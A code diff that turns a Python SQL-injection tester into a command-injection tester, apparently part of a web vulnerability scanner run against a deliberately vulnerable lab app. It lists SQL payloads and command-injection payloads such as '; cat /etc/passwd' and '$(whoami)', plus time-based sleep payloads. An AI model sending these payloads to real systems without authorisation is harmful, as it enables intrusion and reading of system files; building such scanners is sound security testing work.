@@ -1,4 +1,4 @@
-# ── dynamic/sqli_injector.py ─────────────────────────────────────────────────
+# ── dynamic/cmdi_injector.py ─────────────────────────────────────────────────
 
 import time
 import requests
@@ -6,49 +6,56 @@ from bs4 import BeautifulSoup
 
 import config
 
-# ── Error strings that indicate a SQL error in the response ──────────────────
-SQLI_ERRORS = [
-    "you have an error in your sql syntax",
-    "warning: mysql",
-    "unclosed quotation mark",
-    "quoted string not properly terminated",
-    "sql syntax",
-    "mysqli_fetch",
-    "supplied argument is not a valid mysql",
-    "mysql_fetch_array",
-    "division by zero",
-    "odbc_exec",
-    "pg_exec",
-    "sqlite_query",
-    "unterminated string literal",
-    "invalid query",
-    "sql command not properly ended",
-    "mysql_num_rows",
-    "mysql_result",
-    "error in your sql",
+# ── Output patterns that confirm command execution ────────────────────────────
+CMD_PATTERNS = [
+    "root:",            # /etc/passwd
+    "uid=",             # id command output
+    "gid=",             # id command output
+    "windows",          # Windows system info
+    "win32",            # Windows
+    "volume serial",    # Windows dir output
+    "directory of",     # Windows dir output
+    "/bin/",            # Linux path in output
+    "/usr/",            # Linux path in output
+    "daemon:",          # /etc/passwd entry
+    "nobody:",          # /etc/passwd entry
+    "sh:",              # shell error
+    "command not found",# shell error
+    "permission denied",# shell error
 ]
 
-# ── Payloads ──────────────────────────────────────────────────────────────────
-ERROR_PAYLOADS = [
-    "'",
-    "\"",
-    "1'",
-    "' OR '1'='1",
-    "' OR 1=1--",
-    "1' OR '1'='1'--",
+# ── Payload sets ──────────────────────────────────────────────────────────────
+# Each payload tries to run a command and produce visible output
+OUTPUT_PAYLOADS = [
+    "; whoami",
+    "| whoami",
+    "& whoami",
+    "; id",
+    "| id",
+    "& id",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+    "&& cat /etc/passwd",
+    "; ls",
+    "| ls",
+    "; dir",
+    "| dir",
+    "\n whoami",
+    "`whoami`",
+    "$(whoami)",
 ]
 
+# Time-based payloads for blind CMDi (when output is not reflected)
 TIME_PAYLOADS = [
-    "1' AND SLEEP(5)--",
-    "1'; WAITFOR DELAY '0:0:5'--",
+    "; sleep 5",
+    "| sleep 5",
+    "& sleep 5",
+    "; ping -c 5 127.0.0.1",
+    "& timeout 5",          # Windows
+    "| timeout /t 5",       # Windows
 ]
 
-BOOLEAN_PAYLOADS = [
-    ("1' AND 1=1--", "1' AND 1=2--"),
-    ("1' OR 1=1--",  "1' OR 1=2--"),
-]
-
-# URLs to skip — destructive or session-breaking pages
+# URLs to skip
 SKIP_URLS = [
     'setup.php', 'logout.php', 'phpinfo.php',
     'security.php', 'upload.php', 'brute/',
@@ -57,12 +64,11 @@ SKIP_URLS = [
 ]
 
 
-class SQLiInjector:
+class CMDiInjector:
     """
-    Tests each endpoint parameter for SQL Injection:
-    - Error-based  : looks for DB error strings in the response
-    - Time-based   : measures response delay after SLEEP() payload
-    - Boolean-based: compares response size between true/false conditions
+    Tests each endpoint parameter for Command Injection using:
+    - Output-based : looks for OS command output patterns in the response
+    - Time-based   : measures response delay after sleep/ping payloads
     """
 
     def __init__(self, session: requests.Session,
@@ -74,38 +80,37 @@ class SQLiInjector:
     # ── Public entry point ────────────────────────────────────────────────────
 
     def run(self, endpoints: list) -> list:
-        if not self.scan_manager.is_active('sqli'):
+        if not self.scan_manager.is_active('cmdi'):
             return []
 
         findings = []
-        print("  [SQLi] Starting SQL Injection tests...")
+        print("  [CMDi] Starting Command Injection tests...")
 
         safe_endpoints = [
             ep for ep in endpoints
             if not any(skip in ep['url'] for skip in SKIP_URLS)
         ]
 
-        total_params = sum(len(ep['params']) for ep in safe_endpoints)
-        print(f"  [SQLi] Testing {total_params} parameter(s) across "
+        total = sum(len(ep['params']) for ep in safe_endpoints)
+        print(f"  [CMDi] Testing {total} parameter(s) across "
               f"{len(safe_endpoints)} endpoint(s)...")
 
         for ep in safe_endpoints:
             for param in ep['params']:
-                # Skip submit buttons
-                if param.lower() in ('submit', 'btnSign', 'btnClear', 'send'):
+                if param.lower() in ('submit', 'btnsign',
+                                     'btnclear', 'send'):
                     continue
                 result = self._test_parameter(ep, param)
                 if result:
                     findings.append(result)
-                    break   # one finding per endpoint is enough
+                    break
 
-        print(f"  [SQLi] Done. Found {len(findings)} SQLi finding(s).")
+        print(f"  [CMDi] Done. Found {len(findings)} CMDi finding(s).")
         return findings
 
     # ── Re-authentication ─────────────────────────────────────────────────────
 
     def _reauth(self):
-        """Re-login if session has expired."""
         if not self.auth:
             return False
         try:
@@ -128,33 +133,32 @@ class SQLiInjector:
                 timeout=config.REQUEST_TIMEOUT, allow_redirects=True
             )
             if 'login' not in r.url.lower():
-                print(f"  [SQLi] Re-authenticated.")
+                print(f"  [CMDi] Re-authenticated.")
                 return True
-        except Exception as e:
-            print(f"  [SQLi] Re-auth failed: {e}")
+        except Exception:
+            pass
         return False
 
-    # ── Core testing logic ────────────────────────────────────────────────────
+    # ── Core detection ────────────────────────────────────────────────────────
 
     def _test_parameter(self, ep: dict, param: str) -> dict:
-        finding = self._test_error_based(ep, param)
+        # 1. Output-based
+        finding = self._test_output_based(ep, param)
         if finding:
             return finding
+        # 2. Time-based
         finding = self._test_time_based(ep, param)
-        if finding:
-            return finding
-        finding = self._test_boolean_based(ep, param)
         return finding
 
-    def _test_error_based(self, ep: dict, param: str) -> dict:
-        for payload in ERROR_PAYLOADS:
+    def _test_output_based(self, ep: dict, param: str) -> dict:
+        """Inject command payloads and look for OS command output."""
+        for payload in OUTPUT_PAYLOADS:
             response = self._send(ep, param, payload)
             if response is None:
                 continue
 
-            # Detect session expiry — re-auth and retry once
             if self._is_login_page(response):
-                print(f"  [SQLi] Session expired, re-authenticating...")
+                print(f"  [CMDi] Session expired, re-authenticating...")
                 if self._reauth():
                     response = self._send(ep, param, payload)
                     if response is None or self._is_login_page(response):
@@ -163,64 +167,50 @@ class SQLiInjector:
                     return None
 
             body = response.text.lower()
-            for error in SQLI_ERRORS:
-                if error in body:
-                    print(f"  [SQLi] ✓ Error-based: {ep['url']} "
+            for pattern in CMD_PATTERNS:
+                if pattern.lower() in body:
+                    print(f"  [CMDi] ✓ Output-based CMDi: {ep['url']} "
                           f"param='{param}' payload='{payload}'")
                     return self._make_finding(
-                        ep, param, payload, "error-based",
-                        f"DB error: '{error}'"
+                        ep       = ep,
+                        param    = param,
+                        payload  = payload,
+                        method   = "output-based",
+                        evidence = f"Command output pattern detected: '{pattern}'"
                     )
         return None
 
     def _test_time_based(self, ep: dict, param: str) -> dict:
+        """Inject sleep payloads and measure response delay."""
         for payload in TIME_PAYLOADS:
             start    = time.time()
             response = self._send(ep, param, payload)
             elapsed  = time.time() - start
+
             if response is None:
                 continue
+
             if self._is_login_page(response):
                 if self._reauth():
                     continue
                 return None
+
             if elapsed >= config.TIME_BASED_DELAY:
-                print(f"  [SQLi] ✓ Time-based: {ep['url']} "
+                print(f"  [CMDi] ✓ Time-based CMDi: {ep['url']} "
                       f"param='{param}' delay={elapsed:.1f}s")
                 return self._make_finding(
-                    ep, param, payload, "time-based",
-                    f"Response delayed {elapsed:.1f}s"
-                )
-        return None
-
-    def _test_boolean_based(self, ep: dict, param: str) -> dict:
-        for true_p, false_p in BOOLEAN_PAYLOADS:
-            r_true  = self._send(ep, param, true_p)
-            r_false = self._send(ep, param, false_p)
-            if r_true is None or r_false is None:
-                continue
-            if self._is_login_page(r_true) or self._is_login_page(r_false):
-                if self._reauth():
-                    continue
-                return None
-            len_t = len(r_true.text)
-            len_f = len(r_false.text)
-            if len_t == 0:
-                continue
-            diff = abs(len_t - len_f) / len_t
-            if diff > 0.10:
-                print(f"  [SQLi] ✓ Boolean-based: {ep['url']} "
-                      f"param='{param}' diff={diff:.0%}")
-                return self._make_finding(
-                    ep, param, true_p, "boolean-based",
-                    f"Response size differs {diff:.0%} true vs false"
+                    ep       = ep,
+                    param    = param,
+                    payload  = payload,
+                    method   = "time-based",
+                    evidence = f"Response delayed {elapsed:.1f}s "
+                               f"(threshold: {config.TIME_BASED_DELAY}s)"
                 )
         return None
 
     # ── Helpers ───────────────────────────────────────────────────────────────
 
     def _is_login_page(self, response) -> bool:
-        """Return True if the response is the login page."""
         if response is None:
             return False
         if 'login' in response.url.lower():
@@ -230,10 +220,10 @@ class SQLiInjector:
         return False
 
     def _get_user_token(self, url: str) -> str:
-        """Fetch fresh CSRF token from page."""
         try:
             resp  = self.session.get(
-                url, timeout=config.REQUEST_TIMEOUT, allow_redirects=True
+                url, timeout=config.REQUEST_TIMEOUT,
+                allow_redirects=True
             )
             soup  = BeautifulSoup(resp.text, 'html.parser')
             token = soup.find('input', {'name': 'user_token'})
@@ -243,12 +233,10 @@ class SQLiInjector:
 
     def _send(self, ep: dict, param: str,
               payload: str) -> requests.Response:
-        """Send injection request — follows redirects, checks final URL."""
         clean_url = ep['url'].split('#')[0]
         params    = dict(ep['params'])
         params[param] = payload
 
-        # Refresh CSRF token if needed
         if 'user_token' in params:
             params['user_token'] = self._get_user_token(clean_url)
 
@@ -271,7 +259,7 @@ class SQLiInjector:
     def _make_finding(self, ep, param, payload,
                       method, evidence) -> dict:
         return {
-            'type'             : 'sqli',
+            'type'             : 'cmdi',
             'owasp'            : 'A03:2021 - Injection',
             'url'              : ep['url'].split('#')[0],
             'method'           : ep['method'],
